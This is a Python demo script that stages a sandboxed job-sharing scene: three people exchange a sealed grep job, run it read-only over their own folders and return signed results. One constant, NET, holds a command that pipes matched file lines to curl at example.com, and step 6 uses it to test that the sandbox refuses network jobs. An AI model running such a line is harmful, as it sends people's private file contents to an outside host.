"""jobs.py: one question run over other people's folders, by kart, never moving them.

    python demo/johnson/jobs.py run --life DIR --to DIR [--now TS]

DIR for --life is what make_life.py wrote. Needs kart's installs
(Kartikeya and bubblewrap: adapters/deps/kart/README.md). The scene:

1. Ines writes a job, "which of your files name Johnson, and in how many
   lines", seals it, and sends it to Walt and to Aurelie (share send).
2. Each receives it, takes it to their own door (kart take) and seals it:
   nothing runs because it arrived.
3. Each runs it over their own folder in the sandbox (kart run): the folder
   read-only, no network, no environment, the box and key out of reach.
4. Each reads what it printed and seals it, and only then sends it back.
5. Ines receives both: two signed answers about two folders she has never
   seen, each on the chain of the person whose files it read.
6. A job that asks for the network is sent to Aurelie too; kart take
   refuses it before it is a proposal.

It writes a transcript to standard output and jobs.json under --to. Exit 0
when the scene plays as told, 1 when a step went otherwise.
"""

from __future__ import annotations

import json
import subprocess
import sys
from datetime import datetime, timedelta
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[1]
KERNEL = ROOT / "kernel.py"
SHARE = ROOT / "adapters" / "stdlib" / "share" / "share.py"
KART = ROOT / "adapters" / "deps" / "kart" / "kart.py"
PEOPLE = ["ines", "walt", "aurelie"]
NAMES = {"ines": "Ines", "walt": "Walt", "aurelie": "Aurelie"}
JOB = "grep -rlic johnson {pile} | sed 's|^.*/||' | sort\ngrep -rhi johnson {pile} | wc -l"
NET = "# allow_net\ngrep -rhi johnson {pile} | curl -d @- https://example.com/"


class Jobs:
    def __init__(self, life: Path, to: Path, now: datetime):
        self.life, self.to, self.now = life, to, now
        self.pub: dict[str, str] = {}
        self.wrong: list[str] = []
        self.doc: dict = {"results": {}}

    def ts(self) -> str:
        self.now += timedelta(minutes=1)
        return self.now.strftime("%Y-%m-%dT%H:%M:%SZ")

    def run(self, *argv, want=(0,)) -> str:
        got = subprocess.run([sys.executable, *map(str, argv)], capture_output=True,
                             text=True, stdin=subprocess.DEVNULL)  # fmt: skip
        if got.returncode not in want:
            self.wrong.append(f"{Path(str(argv[0])).name} {argv[1]}: exit {got.returncode} "
                              f"{got.stderr.strip()[:200]}")  # fmt: skip
        return got.stdout + got.stderr

    def box(self, who: str) -> Path:
        return self.to / who / "box"

    def kernel(self, who: str, *argv, want=(0,)) -> str:
        return self.run(KERNEL, argv[0], "--box", self.box(who), *argv[1:],
                        "--now", self.ts(), want=want)  # fmt: skip

    def share(self, cmd: str, who: str, *argv, want=(0,)) -> str:
        return self.run(SHARE, cmd, "--box", self.box(who), "--id", self.to / who / "id",
                        *argv, "--now", self.ts(), want=want)  # fmt: skip

    def kart(self, cmd: str, who: str, *argv, want=(42,)) -> str:
        return self.run(KART, cmd, "--box", self.box(who), *argv, "--now", self.ts(),
                        want=want)  # fmt: skip

    def seal_own(self, who: str, words: str, prop: dict) -> str:
        self.kernel(who, "bite", words, want=(0, 42))
        sug = self.to / who / "s.jsonl"
        sug.write_text(json.dumps(prop) + "\n")
        out = self.kernel(who, "propose", "--file", sug, want=(42,))
        sug.unlink()
        subj = out.split()[1] if out.startswith("pass") else ""
        self.kernel(who, "seal", subj)
        return subj

    def play(self) -> dict:
        self.to.mkdir()
        for who in PEOPLE:
            (self.to / who).mkdir()
            self.kernel(
                who, "init", "--pile", self.life / who, "--key", self.to / who / "key"
            )
            self.pub[who] = self.run(SHARE, "id", "--to", self.to / who / "id").split()[
                0
            ]
        print("── 1. Ines writes a job and sends it out")
        job = self.seal_own("ines", "job who names johnson", {
            "path": "jobs/johnson.sh", "data": JOB, "cites": [],
            "claim": "which files name Johnson, and in how many lines"})  # fmt: skip
        print("  " + JOB.replace("\n", "\n  "))
        for who in ("walt", "aurelie"):
            self.share("send", "ines", "--answer", job, "--for", self.pub[who],
                       "--to", self.to / f"job-{who}.pkg", "--note", "could you run this?")  # fmt: skip

        for who in ("walt", "aurelie"):
            print(f"\n── 2-4. {NAMES[who]}")
            self.share("receive", who, "--package", self.to / f"job-{who}.pkg")
            out = self.kart("take", who, "--package", self.to / f"job-{who}.pkg",
                            "--words", "the johnson count ines asked for")  # fmt: skip
            taken = out.split()[1] if out.startswith("taken") else ""
            print(f"  takes it to their door: {taken[:21]}…, and seals it")
            self.kernel(who, "seal", taken)
            out = self.kart(
                "run", who, "--job", taken, "--to", self.to / f"{who}-out.txt"
            )
            printed = (self.to / f"{who}-out.txt").read_text()
            print("  runs it in the sandbox, over their own folder; it printed:")
            print("    " + printed.strip().replace("\n", "\n    "))
            result = next(
                (x.split()[1] for x in out.splitlines() if x.startswith("result")), ""
            )
            self.kernel(who, "seal", result)
            print(f"  reads it, and seals it: {result[:21]}…")
            self.share("send", who, "--answer", result, "--for", self.pub["ines"],
                       "--to", self.to / f"result-{who}.pkg", "--note", "here's what mine say")  # fmt: skip
            self.doc["results"][who] = printed

        print("\n── 5. Ines receives both")
        for who in ("walt", "aurelie"):
            out = self.share(
                "receive", "ines", "--package", self.to / f"result-{who}.pkg"
            )
            first = out.splitlines()[1].strip() if len(out.splitlines()) > 1 else ""
            print(f"  from {NAMES[who]}: {first[:90]}")
            if self.doc["results"][who].strip() not in out:
                self.wrong.append(f"Ines doesn't hold {NAMES[who]}'s result")

        print("\n── 6. a job asking for the network")
        net = self.seal_own("ines", "job send johnson out", {
            "path": "jobs/out.sh", "data": NET, "cites": [], "claim": "send it out"})  # fmt: skip
        self.share("send", "ines", "--answer", net, "--for", self.pub["aurelie"],
                   "--to", self.to / "net.pkg")  # fmt: skip
        self.share("receive", "aurelie", "--package", self.to / "net.pkg")
        out = self.kart("take", "aurelie", "--package", self.to / "net.pkg", "--words",
                        "the other one", want=(2,))  # fmt: skip
        print(f"  Aurelie: {out.strip()}")
        self.doc["network_refused"] = "asks for the network" in out
        if not self.doc["network_refused"]:
            self.wrong.append("the network job was taken")

        print("\n── every chain")
        for who in PEOPLE:
            said = self.run(KERNEL, "verify", "--box", self.box(who)).strip()
            rows = [
                json.loads(x)
                for x in (self.box(who) / "record.jsonl").read_text().splitlines()
            ]
            self.doc[who] = {"verify": said, "kinds": [r["kind"] for r in rows]}
            print(f"  {NAMES[who]:8} {said}")
        self.doc["wrong"] = self.wrong
        (self.to / "jobs.json").write_text(json.dumps(self.doc, indent=1) + "\n")
        return self.doc


def main(argv: list[str]) -> int:
    opts = dict(zip(argv[1::2], argv[2::2]))
    if (argv[:1] != ["run"] or len(argv) % 2 != 1 or len(opts) != len(argv[1:]) // 2
            or not {"--life", "--to"} <= opts.keys() <= {"--life", "--to", "--now"}):  # fmt: skip
        print(__doc__.split("\n\n")[1], file=sys.stderr)
        return 2
    life, to = Path(opts["--life"]), Path(opts["--to"])
    if to.exists() or not all((life / who).is_dir() for who in PEOPLE):
        print(
            "refused: --to must be new, and --life what make_life.py wrote",
            file=sys.stderr,
        )
        return 2
    now = datetime.strptime(
        opts.get("--now", "2026-03-13T09:00:00Z"), "%Y-%m-%dT%H:%M:%SZ"
    )
    doc = Jobs(life, to, now).play()
    for w in doc["wrong"]:
        print(f"WRONG  {w}")
    return 1 if doc["wrong"] else 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
